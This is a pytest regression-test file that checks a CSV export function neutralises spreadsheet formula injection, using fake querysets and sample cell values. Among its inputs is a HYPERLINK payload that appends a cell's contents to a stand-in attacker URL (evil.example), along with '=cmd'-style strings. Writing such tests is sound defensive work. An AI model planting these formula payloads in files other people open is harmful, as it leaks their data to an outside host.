"""
Regression tests for TICKET-03 — CSV formula injection in data exports.

`comaney.csv_export.write_model_csv` is the shared choke point that writes model
data into every CSV/ZIP export. Cell values that begin with a formula-trigger
character (=, +, -, @, tab, CR) are interpreted as formulas by Excel / LibreOffice
Calc when the file is opened, enabling formula injection / DDE. Because account
and project exports include text authored by *other* users (shared-project expense
titles, member names), this is a cross-user reach, not just self-inflicted.

The fix (per the ticket) is to neutralise such leading characters at this choke
point (e.g. prefix the cell with a leading apostrophe so the spreadsheet treats
it as text). These tests assert that neutralisation.

EXPECTED TO FAIL until the fix lands: today the value is written verbatim.

Pure Python — no Django/DB. `write_model_csv` only needs an object exposing
`.model._meta.concrete_fields` and iteration, which we fake here.
Run with: venv/bin/pytest tests/unit/test_csv_formula_injection.py -v
"""
import csv
import io

from comaney.csv_export import write_model_csv

FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


# ── Minimal fakes mimicking a Django queryset's field-introspection surface ──

class _FakeField:
    def __init__(self, name):
        self.name = name
        self.attname = name


class _FakeMeta:
    def __init__(self, field_names):
        self.concrete_fields = [_FakeField(n) for n in field_names]


class _FakeModel:
    def __init__(self, field_names):
        self._meta = _FakeMeta(field_names)


class _FakeQS:
    """Duck-types just enough of a queryset for write_model_csv."""
    def __init__(self, field_names, rows):
        self.model = _FakeModel(field_names)
        self._rows = rows

    def __iter__(self):
        return iter(self._rows)


class _Row:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)


def _emit_rows(field_names, rows):
    """Run write_model_csv and return the parsed data rows (header dropped)."""
    buf = io.StringIO()
    qs = _FakeQS(field_names, [_Row(**r) for r in rows])
    write_model_csv(buf, qs)
    buf.seek(0)
    parsed = list(csv.reader(buf))
    return parsed[1:]  # drop header


def _is_neutralised(cell: str) -> bool:
    """A cell is safe if it no longer *starts* with a formula-trigger char.
    The ticket's suggested fix prefixes a leading apostrophe."""
    return bool(cell) and cell[0] not in FORMULA_PREFIXES


class TestFormulaInjectionNeutralised:

    def test_equals_prefix_is_neutralised(self):
        rows = _emit_rows(["title"], [{"title": "=1+1"}])
        assert _is_neutralised(rows[0][0]), \
            f"'=' formula not neutralised, got {rows[0][0]!r}"

    def test_plus_prefix_is_neutralised(self):
        rows = _emit_rows(["title"], [{"title": "+1+1"}])
        assert _is_neutralised(rows[0][0]), \
            f"'+' formula not neutralised, got {rows[0][0]!r}"

    def test_minus_prefix_is_neutralised(self):
        rows = _emit_rows(["title"], [{"title": "-1-1"}])
        assert _is_neutralised(rows[0][0]), \
            f"'-' formula not neutralised, got {rows[0][0]!r}"

    def test_at_prefix_is_neutralised(self):
        rows = _emit_rows(["title"], [{"title": "@SUM(A1)"}])
        assert _is_neutralised(rows[0][0]), \
            f"'@' formula not neutralised, got {rows[0][0]!r}"

    def test_tab_prefix_is_neutralised(self):
        rows = _emit_rows(["title"], [{"title": "\t=cmd"}])
        assert _is_neutralised(rows[0][0]), \
            f"leading tab not neutralised, got {rows[0][0]!r}"

    def test_hyperlink_dde_payload_is_neutralised(self):
        payload = '=HYPERLINK("https://evil.example/"&C2,"click me")'
        rows = _emit_rows(["title"], [{"title": payload}])
        assert _is_neutralised(rows[0][0]), \
            f"HYPERLINK payload not neutralised, got {rows[0][0]!r}"

    def test_multiple_string_fields_all_neutralised(self):
        rows = _emit_rows(
            ["title", "payee", "note"],
            [{"title": "=evil", "payee": "+evil", "note": "@evil"}],
        )
        assert _is_neutralised(rows[0][0])
        assert _is_neutralised(rows[0][1])
        assert _is_neutralised(rows[0][2])


class TestBenignValuesUnchanged:
    """The fix must only touch values that actually begin with a trigger char;
    ordinary text must round-trip unchanged (no spurious apostrophes)."""

    def test_plain_text_unchanged(self):
        rows = _emit_rows(["title"], [{"title": "Groceries"}])
        assert rows[0][0] == "Groceries"

    def test_internal_operator_unchanged(self):
        # Trigger chars that are not the first character must be left alone.
        rows = _emit_rows(["title"], [{"title": "a-b=c"}])
        assert rows[0][0] == "a-b=c"

    def test_empty_value_unchanged(self):
        rows = _emit_rows(["title"], [{"title": ""}])
        assert rows[0][0] == ""
